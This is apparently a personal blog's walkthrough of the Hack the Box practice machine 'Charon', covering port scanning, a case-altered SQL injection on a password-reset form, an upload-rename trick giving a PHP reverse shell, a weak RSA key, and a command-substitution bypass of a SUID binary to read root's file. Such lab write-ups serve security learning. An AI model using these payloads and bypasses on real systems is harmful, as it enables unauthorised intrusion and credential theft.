---
layout: post
title:  "Hack the Box - Charon"
date:   2015-11-17 16:16:01 -0600
categories: hackthebox sqli html escape hacking writeup
---

<img class="header-img" src="{{ "img/charon/home.png" | relative_url }}" />

The first step, as (almost) always, is to enumerate any open ports on the machine.

{% highlight shell %}
~ » nmap 10.10.10.31 -sS -A
Nmap scan report for 10.10.10.31
Host is up (0.022s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; p
| ssh-hostkey: 
|   2048 09:c7:fb:a2:4b:53:1a:7a:f3:30:5e:b8:6e:ec:83:ee (RSA)
|   256 97:e0:ba:96:17:d4:a1:bb:32:24:f4:e5:15:b4:8a:ec (ECDSA)
|_  256 e8:9e:0b:1c:e7:2d:b6:c9:68:46:7c:b3:32:ea:e9:ef (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Frozen Yogurt Shop
Warning: OSScan results may be unreliable because we could not find a
Device type: general purpose
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (91%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/
Aggressive OS guesses: Linux 3.11 - 4.1 (91%), Linux 3.2.0 (90%), Lin%), Linux 3.10 - 4.8 (85%), Linux 3.2 - 4.8 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   22.54 ms 10.10.14.1
2   22.95 ms 10.10.10.31

OS and Service detection performed. Please report any incorrect resul
Nmap done: 1 IP address (1 host up) scanned in 20.81 seconds
{% endhighlight %}

Only 22 and 80 are open, so let's continue to enumerate and see what we can find on port 80. It appears to be a page for the "Freeeze" frozen yogurt shop. Everything is static except for the blog posts, which have URLs of the form: `http://charon.htb/singlepost.php?id=10`. Simple manual testing indicates that this is vulnerable -
{% highlight shell %}
http://charon.htb/singlepost.php?id=0%20union%20select%201,1,1,1,1
{% endhighlight %}
so let's put sqlmap on the case, and keep moving forward:
{% highlight shell %}
~ » sqlmap -u "http://charon.htb/singlepost.php?id=10" --level=5 --risk=3 --technique=U
{% endhighlight %}
(strangely sqlmap fails on this simple case...in any case, this database isn't useful to us)

Moving onwards, what should stick out to you is that the footer indicates this site is powered by "SuperCMS." That means we should definitely start looking for the login portal for "SuperCMS." This doesn't appear to be an actual CMS system, so we'll have to fall back to dirbuster to enumerate. I used the default wordlist `directory-list-2.3-medium.txt` which pretty quickly hits `/cmsdata/login.php`.

This leads us to a login page that appears not to be vulnerable to SQL injection, and a "Forgot Password" page that looks like it might be. The reasoning here is that the Login page returns the same error messages no matter what is passed, and has no decernable blind SQLi vulnerabilities. Meanwhile, the forgot password page gives at least 2 different types of errors:
```
' -> Incorrect format
x@x.c -> User not found with that email! 
``` 

A handy tricky for running / debugging sqlmap is to run it through Burpsuite:
{% highlight shell %}
~ » sqlmap -u "http://charon.htb/cmsdata/forgot.php" --data="email=x@x.c"  --level=5 --risk=3 --proxy=http://localhost:8080
{% endhighlight %}
sqlmap comes back with a potential blind SQLi vulnerability:
{% highlight shell %}
[...]
sqlmap identified the following injection point(s) with a total of 1122 HTTP(s) requests:
---
Parameter: email (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: email=x@x.c' RLIKE (SELECT (CASE WHEN (3782=3782) THEN 0x7840782e63 ELSE 0x28 END))-- DcMQ
---
[14:26:33] [INFO] the back-end DBMS is MySQL
[...]
{% endhighlight %}
but something that sticks out right away are the responses for UNION based injections:
<img src="{{ "img/charon/burp.png" | relative_url }}" />

Their response size and error message were drastically different than the rest, so let's take a closer look.

Working our way down the  <a href="https://www.owasp.org/index.php/SQL_Injection_Bypassing_WAF">WAF Bypassing Strings list</a>, we quickly find that changing the casing on `UNION` gets us past the error. Using the limitations that we know of (the queryset must return an email), and expanding the union count, we hit the jackpot on:
`' UnION SELECT 'x@x.c', 'x@x.c', 'x@x.c', 'x@x.c`
<img src="{{ "img/charon/bingo.png" | relative_url }}" />

The next step is to subsitute different values for `x@x.c` to see what gets echoed back to us and what has to be an email. After a short period, we quickly find this:
`' UnION SELECT '', (payload), '', 'x@x.c`.
From there we either manually query the database, or use our favorite tool, but we can quickly get the list of users and passwords (there are some other tricky aspects to this SQLi like dummy data, orderings, etc., but I'll leave that to the reader as an exercise):
`super_cms_adm / tamarro`

After logging in, there a few possible vulnerabilities: we can edit existing pages, create new pages, and upload images. Let's take a look at the image upload first. After doing a few probing tests, it's discovered that there is both client and server-side checks to make sure we're uploading an actual image, and that the extension is that of an image. Right when we're about to call this a dead end, we inspect the HTML source and see something funny:
{% highlight html %}
<form action="upload.php" method="POST" onsubmit="javascript:return ValidateImage(this);" name="frm" enctype="multipart/form-data">
<input type="file" name="image" />
<!-- <input type=hidden name="dGVzdGZpbGUx"> -->
<input type="submit"/>
</form>
{% endhighlight %}

`dGVzdGZpbGUx` looks a lot like base64, and when we decode it, we get `testfile1`, so clearly this is a tool for testing the upload. What happens when we decode it, give it a value, and try to upload something (I took a Blank.png file and inserted a reverse PHP shell into the middle of it to bypass the image restrictions):
<img src="{{ "img/charon/burp2.png" | relative_url }}" />

It renames the file for us! This lets us rename our "image" to a `.php` file and the web server will execute it as PHP and give us a reverse shell.

Once on the box, we quickly `cd` to `/home/decoder` and find a public key and encrypted password. 
{% highlight shell %}
$ cat decoder.pub
-----BEGIN PUBLIC KEY-----
MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhALxHhYGPVMYmx3vzJbPPAEa10NETXrV3
mI9wJizmFJhrAgMBAAE=
-----END PUBLIC KEY-----
{% endhighlight %}

This is an extremely short key, and is trivially breakable (via something like <a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool</a>). Once we break it and get the private key, we can decrypt `pass.crypt` which gives us the ssh password for decoder.

Now we can SSH in as decoder, `cat user.txt` and begin to think about priv esc. One of my first steps during priv esc is always `sudo -l` and to look for SUID/SGID binaries:
{% highlight shell %}
$ find / -perm -u=s -type f 2>/dev/null
/usr/local/bin/supershell
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/at
/usr/bin/newgidmap
/usr/bin/newuidmap
/bin/ntfs-3g
/bin/ping6
/bin/mount
/bin/fusermount
/bin/umount
/bin/ping
/bin/su
{% endhighlight %}

`supershell` is obviously very suspect here, and is our most likely route to root. Let's try to figure out how this works:
{% highlight shell %}
$ supershell
Supershell (very beta)
usage: supershell <cmd>
$ supershell cat /root/root.txt
Supershell (very beta)
usage: supershell <cmd>
$ ltrace supershell
__libc_start_main(0x40082f, 1, 0x7fff323b28d8, 0x400940 <unfinished ...>
puts("Supershell (very beta)"Supershell (very beta)
)                                     = 23
puts("usage: supershell <cmd>"usage: supershell <cmd>
)                                    = 24
exit(1 <no return ...>
+++ exited (status 1) +++
$ ltrace supershell "ls ."
__libc_start_main(0x40082f, 2, 0x7ffc3bb1aa88, 0x400940 <unfinished ...>
puts("Supershell (very beta)"Supershell (very beta)
)                                     = 23
strncpy(0x7ffc3bb1a890, "ls ,", 255)                               = 0x7ffc3bb1a890
strcspn("ls ,", "|`&><'"\\[]{};#")                                 = 4
strlen("ls ,")                                                     = 4
strncmp("ls ,", "/bin/ls", 7)                                      = 61
+++ exited (status 0) +++
{% endhighlight %}

So, it's making sure we're _only_ running `/bin/ls` and that our input doesn't contain any of `` |&><'"\\[]{};#\` ``. To get around this requires a little bash knowledge, and a little creativity. First, it's pretty obviously missing a 3 big characters from it's blacklist: `$()`. This lets us execute a command _before_ `ls` runs. After doing a few local tests, it seems `ls` outputs the full file contents of a file if you try to list it:

{% highlight shell %}
~ » echo "givemeroot" > test_file
~ » ls "$(cat test_file)"
ls: cannot access 'givemeroot': No such file or directory
{% endhighlight %}

From there, it's simple:

{% highlight shell %}
$ supershell "/bin/ls \$(cat /root/root.txt)"
/bin/ls: cannot access 'REDACTED': No such file or directory
{% endhighlight %}